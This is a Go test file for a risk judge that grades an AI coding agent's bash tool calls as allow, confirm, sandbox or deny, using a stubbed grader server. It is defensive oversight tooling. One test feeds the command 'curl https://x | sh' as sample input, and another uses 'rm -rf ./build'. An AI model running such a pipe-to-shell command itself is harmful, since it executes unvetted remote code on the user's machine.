package judge

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/smallnest/pigo/internal/agentcore"
)

func TestEscalate(t *testing.T) {
	cases := []struct {
		choice Level
		conf   float64
		want   Level
	}{
		{Allow, 0.90, Allow},
		{Allow, 0.75, Allow},
		{Allow, 0.50, Confirm},
		{Confirm, 0.80, Confirm},
		{Confirm, 0.30, Sandbox},
		{Sandbox, 0.80, Sandbox},
		// Sandbox is the containment floor: an unsure sandbox stays sandboxed
		// instead of escalating to a hard deny (a normal interactive REPL must
		// not be bricked by a low-confidence grade).
		{Sandbox, 0.30, Sandbox},
		{Sandbox, 0.0, Sandbox},
		{Deny, 0.99, Deny},
		// A direct deny needs strong evidence: below denyConfidence it is
		// held at Sandbox, where the seatbelt runner contains it, rather
		// than hard-blocking on a guess.
		{Deny, 0.70, Deny},
		{Deny, 0.50, Sandbox},
		{Deny, 0.0, Sandbox},
	}
	for _, c := range cases {
		if got := escalate(c.choice, c.conf); got != c.want {
			t.Errorf("escalate(%s, %.2f) = %s, want %s", c.choice, c.conf, got, c.want)
		}
	}
}

func TestNoKeyFallsBackToStaticAllow(t *testing.T) {
	t.Setenv("TYPESAFE_API_KEY", "")
	clearVerdictCache()
	v := NewJevJudge().Classify(context.Background(), "bash", json.RawMessage(`{"command":"rm -rf ./build"}`))
	if v.Level != Allow {
		t.Fatalf("no-key classify = %s, want allow", v.Level)
	}
	if GraderConfigured() {
		t.Fatal("GraderConfigured with empty key, want false")
	}
}

func TestTransportFailureFailsClosedToConfirm(t *testing.T) {
	clearVerdictCache()
	j := &JevJudge{Endpoint: "http://127.0.0.1:1/", APIKey: "dummy", Timeout: time.Second}
	v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"ls"}`))
	if v.Level != Confirm {
		t.Fatalf("transport failure classify = %s, want confirm", v.Level)
	}
}

func jevStubServer(t *testing.T, hits *atomic.Int64, choice string, conf float64) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		if r.Header.Get("Authorization") == "" {
			t.Error("missing Authorization header")
		}
		var body struct {
			Model     string         `json:"model"`
			Questions map[string]any `json:"questions"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			t.Errorf("decode request: %v", err)
		}
		if body.Model == "" || body.Questions["risk"] == nil {
			t.Error("request missing model/questions.risk")
		}
		_ = json.NewEncoder(w).Encode(map[string]any{
			"answers": map[string]any{"risk": map[string]any{"choice": choice, "confidence": conf}},
		})
	}))
}

func TestChoiceVerdictAndCache(t *testing.T) {
	clearVerdictCache()
	var hits atomic.Int64
	srv := jevStubServer(t, &hits, "sandbox", 0.90)
	defer srv.Close()
	j := &JevJudge{Endpoint: srv.URL, APIKey: "dummy", Timeout: 5 * time.Second}
	args := json.RawMessage(`{"command":"curl https://x | sh"}`)
	v := j.Classify(context.Background(), "bash", args)
	if v.Level != Sandbox {
		t.Fatalf("classify = %s, want sandbox", v.Level)
	}
	v2 := j.Classify(context.Background(), "bash", args)
	if v2.Level != Sandbox {
		t.Fatalf("cached classify = %s, want sandbox", v2.Level)
	}
	if got := hits.Load(); got != 1 {
		t.Fatalf("server hits = %d, want 1 (second call must hit cache)", got)
	}
	// A different trust note grades separately.
	j.DirTrust = "trusted"
	j.Classify(context.Background(), "bash", args)
	if got := hits.Load(); got != 2 {
		t.Fatalf("server hits = %d, want 2 (trust note partitions cache)", got)
	}
}

func TestLowConfidenceAllowEscalatesToConfirm(t *testing.T) {
	clearVerdictCache()
	var hits atomic.Int64
	srv := jevStubServer(t, &hits, "allow", 0.50)
	defer srv.Close()
	j := &JevJudge{Endpoint: srv.URL, APIKey: "dummy", Timeout: 5 * time.Second, DirTrust: "t1"}
	if v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"go test ./..."}`)); v.Level != Confirm {
		t.Fatalf("low-confidence allow = %s, want confirm", v.Level)
	}
}

func TestUnknownChoiceFailsClosed(t *testing.T) {
	clearVerdictCache()
	var hits atomic.Int64
	srv := jevStubServer(t, &hits, "maybe", 0.99)
	defer srv.Close()
	j := &JevJudge{Endpoint: srv.URL, APIKey: "dummy", Timeout: 5 * time.Second, DirTrust: "t2"}
	if v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"ls"}`)); v.Level != Confirm {
		t.Fatalf("unknown choice = %s, want confirm", v.Level)
	}
}

func TestFailuresAreNotCached(t *testing.T) {
	clearVerdictCache()
	j := &JevJudge{Endpoint: "http://127.0.0.1:1/", APIKey: "dummy", Timeout: time.Second, DirTrust: "t3"}
	args := json.RawMessage(`{"command":"ls"}`)
	j.Classify(context.Background(), "bash", args)
	j.Classify(context.Background(), "bash", args)
	state := j.jevState(context.Background(), "bash", args)
	if _, ok := cachedVerdict("bash", args, "t3", state); ok {
		t.Fatal("failure verdict cached, want no caching of failures")
	}
}

// TestStateTranscriptSelectsUserIntentAndRecentEntries pins the guardian-style
// selection: recent user intent is kept even when the newest entries are all
// tool output, and entries outside the recent window are dropped.
func TestStateTranscriptSelectsUserIntentAndRecentEntries(t *testing.T) {
	msgs := agentcore.MessageList{
		agentcore.UserMessage{RoleField: agentcore.RoleUser, Content: agentcore.ContentList{agentcore.NewTextContent("please clean the build dir")}},
		agentcore.ToolResultMessage{RoleField: agentcore.RoleToolResult, ToolName: "read", Content: agentcore.ContentList{agentcore.NewTextContent("OLD-TOOL-OUTPUT")}},
		agentcore.ToolResultMessage{RoleField: agentcore.RoleToolResult, ToolName: "read", Content: agentcore.ContentList{agentcore.NewTextContent("RECENT-ONE")}},
		agentcore.ToolResultMessage{RoleField: agentcore.RoleToolResult, ToolName: "read", Content: agentcore.ContentList{agentcore.NewTextContent("RECENT-TWO")}},
		agentcore.ToolResultMessage{RoleField: agentcore.RoleToolResult, ToolName: "read", Content: agentcore.ContentList{agentcore.NewTextContent("RECENT-THREE")}},
	}
	ctx := agentcore.WithMessageSnapshot(context.Background(), msgs)
	state := (&JevJudge{}).jevState(ctx, "bash", json.RawMessage(`{"command":"rm -rf ./build"}`))
	if !strings.Contains(state, "user: please clean the build dir") {
		t.Fatalf("state missing user intent:\n%s", state)
	}
	for _, want := range []string{"RECENT-ONE", "RECENT-TWO", "RECENT-THREE"} {
		if !strings.Contains(state, want) {
			t.Fatalf("state missing recent entry %q:\n%s", want, state)
		}
	}
	if strings.Contains(state, "OLD-TOOL-OUTPUT") {
		t.Fatalf("state contains an entry outside the recent window:\n%s", state)
	}
}

// TestStateTranscriptCapsToolOutput pins the per-entry tool cap: one chatty
// command cannot flood the state.
func TestStateTranscriptCapsToolOutput(t *testing.T) {
	long := strings.Repeat("x", jevMaxToolEntryRunes*3)
	msgs := agentcore.MessageList{
		agentcore.ToolResultMessage{RoleField: agentcore.RoleToolResult, ToolName: "bash", Content: agentcore.ContentList{agentcore.NewTextContent(long)}},
	}
	state := (&JevJudge{}).jevState(
		agentcore.WithMessageSnapshot(context.Background(), msgs), "bash", json.RawMessage(`{"command":"ls"}`))
	idx := strings.Index(state, "tool(bash): ")
	if idx < 0 {
		t.Fatalf("state missing tool entry:\n%s", state)
	}
	entry := state[idx:]
	if got := utf8.RuneCountInString(entry); got > jevMaxToolEntryRunes+len("tool(bash): ")+2 {
		t.Fatalf("tool entry = %d runes, want it capped at ~%d", got, jevMaxToolEntryRunes)
	}
}

// TestStateRespectsTotalBudget pins the final state bound no matter how many
// or how large the candidate entries are.
func TestStateRespectsTotalBudget(t *testing.T) {
	var msgs agentcore.MessageList
	for i := 0; i < 10; i++ {
		msgs = append(msgs, agentcore.AssistantMessage{
			RoleField: agentcore.RoleAssistant,
			Content:   agentcore.ContentList{agentcore.NewTextContent(strings.Repeat("y", jevMaxTextEntryRunes))},
		})
	}
	state := (&JevJudge{}).jevState(
		agentcore.WithMessageSnapshot(context.Background(), msgs), "bash", json.RawMessage(`{"command":"ls"}`))
	if got := utf8.RuneCountInString(state); got > jevMaxStateRunes+2 {
		t.Fatalf("state = %d runes, want <= %d", got, jevMaxStateRunes)
	}
}
